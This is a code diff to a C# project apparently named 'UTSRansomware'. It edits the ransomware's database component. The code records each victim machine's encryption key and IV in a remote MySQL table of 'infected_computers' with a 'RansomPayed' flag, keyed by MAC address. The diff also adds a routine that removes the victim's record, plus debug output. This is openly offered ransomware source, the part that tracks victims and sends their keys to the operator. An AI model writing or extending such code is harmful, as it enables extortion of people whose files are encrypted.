@@ -17,7 +17,7 @@ namespace UTSRansomware
             return new MySqlConnection(connectionString);
         }
 
-        public static void AddComputerToDatabase(byte[] key, byte[] iv)
+        public static void AddComputer(byte[] key, byte[] iv)
         {
             string convertedKey = Convert.ToBase64String(key);
             string convertedIV = Convert.ToBase64String(iv);
@@ -34,6 +34,7 @@ namespace UTSRansomware
                     cmd.Parameters.AddWithValue("@RansomPayed", false);
 
                     cmd.ExecuteNonQuery();
+                    Console.WriteLine("Computer added to DB");
                 }
             }
         }
@@ -48,11 +49,28 @@ namespace UTSRansomware
                 string query = "SELECT COUNT(*) FROM infected_computers WHERE computer_id = @computerId";
                 using (MySqlCommand cmd = new MySqlCommand(query, connection))
                 {
-                    cmd.Parameters.AddWithValue("@computerId", GetMACAddress);
+                    cmd.Parameters.AddWithValue("@computerId", GetMACAddress());
                     int count = Convert.ToInt32(cmd.ExecuteScalar());
 
                     // If count is greater than 0, then the computer exists in the table
                     return count > 0;
+                }
+            }
+        }
+
+        public static void RemoveComputer()
+        {
+            using (MySqlConnection connection = new MySqlConnection(connectionString))
+            {
+                connection.Open();
+
+                // Define the query
+                string query = "DELETE FROM infected_computers WHERE computer_id = @computerId";
+                using (MySqlCommand cmd = new MySqlCommand(query, connection))
+                {
+                    cmd.Parameters.AddWithValue("@computerId", GetMACAddress());
+                    cmd.ExecuteNonQuery();
+                    Console.WriteLine("Computer removed from DB");
                 }
             }
         }
@@ -65,7 +83,9 @@ namespace UTSRansomware
                 if (nic.NetworkInterfaceType == NetworkInterfaceType.Ethernet &&
                     nic.OperationalStatus == OperationalStatus.Up)
                 {
-                    return nic.GetPhysicalAddress().ToString();
+                    string MACAddress = nic.GetPhysicalAddress().ToString();
+                    Console.WriteLine($"Got MAC Address: {MACAddress}");
+                    return MACAddress;
                 }
             }
             return String.Empty;
